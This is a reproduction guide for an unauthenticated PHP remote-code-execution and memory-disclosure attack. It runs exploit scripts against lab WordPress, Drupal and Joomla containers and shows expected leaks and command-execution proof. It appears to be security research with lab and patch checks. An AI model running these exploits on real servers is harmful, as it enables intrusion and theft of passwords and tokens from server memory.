# Wiz Research Reproduction Guide

> Step-by-step reproduction of the PHP2Shell findings from the [Wiz Research blog post](https://www.wiz.io/blog/php2shell-php-rce).

---

## Prerequisites

- Docker & Docker Compose
- Python 3.8+
- ~2GB disk space (Docker images)
- Linux host or WSL2 recommended

---

## Step 1: Set Up the Lab

```bash
cd lab/
docker-compose up -d

# Wait for services to be healthy
docker-compose ps
```

Verify PHP version:

```bash
docker exec $(docker ps -q -f name=wordpress) php -v
# Expected: PHP 8.4.26 (cli) (built: ...)
```

Verify SAPI:

```bash
docker exec $(docker ps -q -f name=wordpress) php -r "echo php_sapi_name();"
# Expected: apache2handler (mod_php)
```

---

## Step 2: Memory Disclosure (Bug 2)

This demonstrates the Heartbleed-style memory leak:

```bash
python3 exploit/memdisclosure.py \
    -u http://127.0.0.1:9080/index.php \
    --dump evidence/leak.bin \
    --analyze
```

**Expected output:**
```
[+] LEAK! cookie=4096b
[*] Pointer analizi: 98 pointer bulundu
    Zend MM chunk base: 0x7242f2400000 (98x)
```

This proves that PHP worker memory is readable via the session cookie — passwords, tokens, and heap addresses are exposed.

---

## Step 3: WordPress RCE (Bug 1 + Bug 2)

```bash
python3 exploit/php2shell_exploit.py \
    -u http://127.0.0.1:9080/index.php \
    -c "id>/out/p" \
    --target-os linux
```

**Expected output:**
```
[+] Zend MM chunk base = 0x7242f2400000
[+] libphp base = 0x7242f40d1000
[+] Komut calisti (attempt 1)
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Check the proof file:

```bash
docker exec $(docker ps -q -f name=wordpress) cat /out/p
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Step 4: Drupal RCE

```bash
python3 exploit/php2shell_exploit.py \
    -u http://127.0.0.1:9081/index.php \
    -c "id>/out/p" \
    --target-os linux
```

**Expected:** Same `uid=33(www-data)` proof.

---

## Step 5: Joomla RCE

```bash
python3 exploit/php2shell_exploit.py \
    -u http://127.0.0.1:9082/index.php \
    -c "id>/out/p" \
    --target-os linux
```

**Expected:** Same `uid=33(www-data)` proof.

---

## Step 6: FPM Comparison

To verify that PHP-FPM is NOT vulnerable, spin up an FPM target:

```bash
docker run -d --name fpm-test -p 9090:80 \
    php:8.4.26-fpm-alpine

python3 exploit/php2shell_exploit.py \
    -u http://127.0.0.1:9090/index.php \
    -c "id>/out/p" \
    --target-os linux
```

**Expected:** All 3 heap leak attempts fail. FPM's process model prevents exploitation.

---

## Step 7: Patch Verification

```bash
# Stop vulnerable lab
docker-compose down

# Start patched version
docker run -d --name patched-test -p 9080:80 \
    wordpress:6.7-php8.4-apache
# (After PHP 8.4.27 becomes the default in the image)

python3 exploit/php2shell_exploit.py \
    -u http://127.0.0.1:9080/index.php \
    -c "id>/out/p" \
    --target-os linux
```

**Expected:** Heap leak fails. The patch prevents the stale reference.

---

## Step 8: Bug 3 Reproduction (PHP 8.5.11)

The lab ships a ready-made Bug 3 target (`lab/Dockerfile.bug3`,
`fatal_error_backtraces=On`, `memory_limit=8M`, `lab/www-bug3/` with
`oom.php`, `index.php` and the `.htaccess` deprecation trigger):

```bash
cd lab && docker compose --profile bug3 up -d bug3   # http://127.0.0.1:9083

python3 exploit/bug3_backtrace_uaf.py \
    --host 127.0.0.1 --port 9083 \
    --rounds 50 --verbose
```

The script first takes a **baseline** consumer reading; if the consumer
is already unhealthy without a producer, the run is aborted instead of
attributing the failure to the UAF. Only worker crashes (connection
reset) count as UAF candidates; plain 5xx responses are reported as
inconclusive weak signals.

## Step 9: Bug 4 Probe (OPcache)

```bash
cd lab && docker compose --profile bug4 up -d bug4   # http://127.0.0.1:9084

python3 exploit/bug4_opcache_confusion.py \
    --host 127.0.0.1 --port 9084 --rounds 50
```

The lab exposes `opcache_probe.php`, a small JSON snapshot of OPcache
state. The script compares each post-OOM snapshot against the baseline;
only probe-confirmed inconsistencies (or worker crashes) count as
signals — 5xx responses alone are reported as inconclusive.

**Expected:**
```
[!!] UAF candidate at round 3: consumer connection reset
UAF candidates (crash/5xx on consumer): 5/50
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Heap leak always fails | Check PHP version (`php -v`), must be < 8.4.27 |
| All 10/10 fail on mod_php | Check `memory_limit` in php.ini (needs to allow OOM trigger) |
| Works on WordPress but not Drupal | Drupal may need different port; check `docker-compose ps` |
| Stage 3 proof not appearing | Command may exceed 14-byte limit; use shorter command |
| Connection refused | Ensure Docker containers are running: `docker-compose ps` |

---

## Notes

- The exploit is **fully unauthenticated** — no credentials needed
- The exploit is **application-agnostic** — any PHP app on mod_php is affected
- The exploit uses only **standard HTTP multipart POST** requests
- **No file upload functionality** is needed in the target application
- **No `session_start()`** is needed in the target application
